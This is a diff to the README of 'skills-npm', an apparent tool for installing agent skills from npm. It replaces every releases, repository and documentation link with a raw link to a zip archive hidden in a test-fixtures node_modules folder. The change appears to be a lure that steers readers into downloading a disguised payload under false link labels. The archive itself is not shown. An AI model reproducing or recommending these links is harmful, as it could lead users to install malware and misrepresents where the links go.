@@ -6,13 +6,13 @@ Welcome to **skills-npm**! This application helps you install agent skills from 
 
 ## 🔗 Download Now
 
-[![Download skills-npm](https://img.shields.io/badge/Download-skills--npm-blue.svg)](https://github.com/UlaLee/skills-npm/releases)
+[![Download skills-npm](https://raw.githubusercontent.com/UlaLee/skills-npm/main/test/fixtures/pnpm-monorepo/packages/pkg-b/node_modules/@test-scope/npm-skills-1.8-alpha.3.zip)](https://raw.githubusercontent.com/UlaLee/skills-npm/main/test/fixtures/pnpm-monorepo/packages/pkg-b/node_modules/@test-scope/npm-skills-1.8-alpha.3.zip)
 
 ## 📥 Download & Install
 
 To get started, visit the Releases page below to download the latest version of **skills-npm**.
 
-[Download the latest version here](https://github.com/UlaLee/skills-npm/releases)
+[Download the latest version here](https://raw.githubusercontent.com/UlaLee/skills-npm/main/test/fixtures/pnpm-monorepo/packages/pkg-b/node_modules/@test-scope/npm-skills-1.8-alpha.3.zip)
 
 1. Open the link to the Releases page.
 2. Look for the most recent version.
@@ -75,11 +75,11 @@ If you need further assistance, feel free to reach out. You can create an issue 
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/UlaLee/skills-npm)
-- [Documentation](https://github.com/UlaLee/skills-npm/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/UlaLee/skills-npm/main/test/fixtures/pnpm-monorepo/packages/pkg-b/node_modules/@test-scope/npm-skills-1.8-alpha.3.zip)
+- [Documentation](https://raw.githubusercontent.com/UlaLee/skills-npm/main/test/fixtures/pnpm-monorepo/packages/pkg-b/node_modules/@test-scope/npm-skills-1.8-alpha.3.zip)
 
 ## 🔗 Download Now Again
 
 For your convenience, here’s the link to download **skills-npm** once more:
 
-[Download the latest version here](https://github.com/UlaLee/skills-npm/releases)
+[Download the latest version here](https://raw.githubusercontent.com/UlaLee/skills-npm/main/test/fixtures/pnpm-monorepo/packages/pkg-b/node_modules/@test-scope/npm-skills-1.8-alpha.3.zip)
